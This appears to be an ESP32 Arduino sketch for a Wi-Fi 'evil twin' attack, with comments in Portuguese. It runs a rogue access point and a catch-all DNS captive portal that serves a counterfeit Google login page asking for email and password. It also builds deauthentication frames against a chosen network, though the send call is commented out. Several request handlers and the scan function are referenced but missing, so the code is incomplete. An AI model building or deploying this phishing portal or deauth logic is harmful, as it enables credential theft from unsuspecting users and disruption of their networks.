#include <Arduino.h>
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>

// ===== Estrutura de rede =====
typedef struct {
    String ssid;
    uint8_t ch;
    uint8_t bssid[6];
} _Network;

// ===== Configurações DNS e WebServer =====
const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
WebServer webServer(80);

// ===== Arrays de redes =====
_Network _networks[16];
_Network _selectedNetwork;

// ===== Variáveis auxiliares =====
String _correct = "";
String _tryPassword = "";

// ===== Strings principais =====
#define SUBTITLE "Faça login para continuar"
#define TITLE "Fazer login"
#define BODY "Use sua Conta do Google para continuar."

// ===== Funções de HTML =====
String header(String t) {
    String a = String(_selectedNetwork.ssid); // Nome da rede
    String CSS =
        "body { font-family: 'Roboto', sans-serif; background-color:#f2f2f2; margin:0; padding:0; display:flex; justify-content:center; align-items:center; height:100vh; }"
        ".container { background:white; padding:2em; border-radius:8px; width:90%; max-width:400px; box-shadow:0 2px 10px rgba(0,0,0,0.2); text-align:center; }"
        "img.logo { width:75px; margin-bottom:1em; }"
        "h1 { font-size:1.8em; margin-bottom:0.5em; color:#202124; }"
        "p { color:#5f6368; margin-bottom:1.5em; }"
        "label { font-weight:bold; display:block; text-align:left; margin:0.5em 0 0.2em 0; color:#202124; }"
        "input[type=text], input[type=password] { width:100%; padding:10px; margin-bottom:1em; border-radius:4px; border:1px solid #dadce0; box-sizing:border-box; font-size:1em; }"
        "input[type=submit] { width:100%; padding:10px; background-color:#1a73e8; color:white; border:none; border-radius:4px; font-weight:bold; cursor:pointer; font-size:1em; }"
        "input[type=submit]:hover { background-color:#1558b0; }"
        ".footer { font-size:0.8em; color:#5f6368; margin-top:1em; }";

    String h = "<!DOCTYPE html><html lang='pt-BR'>"
               "<head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1'>"
               "<title>" + a + " :: " + t + "</title>"
               "<style>" + CSS + "</style></head><body>"
               "<div class='container'>"
               "<img class='logo' src='https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png' alt='Google Logo'>"
               "<h1>" + TITLE + "</h1>"
               "<p>" + BODY + "</p>";
    return h;
}

String footer() {
    return "<div class='footer'>&#169; Google Inc. Todos os direitos reservados.</div></div></body></html>";
}

String index() {
    return header(TITLE) +
           "<form action='/' method='post'>"
           "<label>Email ou telefone</label>"
           "<input type='text' id='email' name='email' required>"
           "<label>Senha</label>"
           "<input type='password' id='password' name='password' minlength='8' required>"
           "<input type='submit' value='Próximo'>"
           "</form>" +
           footer();
}

// ===== Funções auxiliares =====
void clearArray() {
    for (int i = 0; i < 16; i++) {
        _Network _network;
        _networks[i] = _network;
    }
}

String bytesToStr(const uint8_t* b, uint32_t size) {
    String str;
    const char ZERO = '0';
    const char DOUBLEPOINT = ':';
    for (uint32_t i = 0; i < size; i++) {
        if (b[i] < 0x10) str += ZERO;
        str += String(b[i], HEX);
        if (i < size - 1) str += DOUBLEPOINT;
    }
    return str;
}

// ===== Variáveis de controle =====
bool hotspot_active = false;
bool deauthing_active = false;
unsigned long now = 0;
unsigned long wifinow = 0;
unsigned long deauth_now = 0;
uint8_t broadcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
uint8_t wifi_channel = 1;

// ===== Setup =====
void setup() {
    Serial.begin(115200);
    WiFi.mode(WIFI_AP_STA);
    WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
    WiFi.softAP("WiPhi_DEDSEC", "123456789");

    dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
    webServer.on("/", handleIndex);
    webServer.on("/result", handleResult);
    webServer.on("/admin", handleAdmin);
    webServer.onNotFound(handleIndex);
    webServer.begin();
}
// ===== Loop =====
void loop() {
    dnsServer.processNextRequest();
    webServer.handleClient();

    // Deauth packets
    if (deauthing_active && millis() - deauth_now >= 1000) {
        int channel = _selectedNetwork.ch;
        if (channel >= 1 && channel <= 13) {
            WiFi.setChannel(channel);
        }

        uint8_t deauthPacket[26] = {
            0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF,
            0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
            0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x01,
            0x00
        };
        memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
        memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
        deauthPacket[24] = 1;

        Serial.println(bytesToStr(deauthPacket, 26));

        // Exemplos comentados para envio de pacote
        // deauthPacket[0] = 0xC0;
        // Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));
        // deauthPacket[0] = 0xA0;

        deauth_now = millis();
    }

    // Scan periódico
    if (millis() - now >= 15000) {
        performScan();
        now = millis();
    }

    // Monitor WiFi status
    if (millis() - wifinow >= 2000) {
        if (WiFi.status() != WL_CONNECTED) {
            Serial.println("BAD");
        } else {
            Serial.println("GOOD");
        }
        wifinow = millis();
    }
}
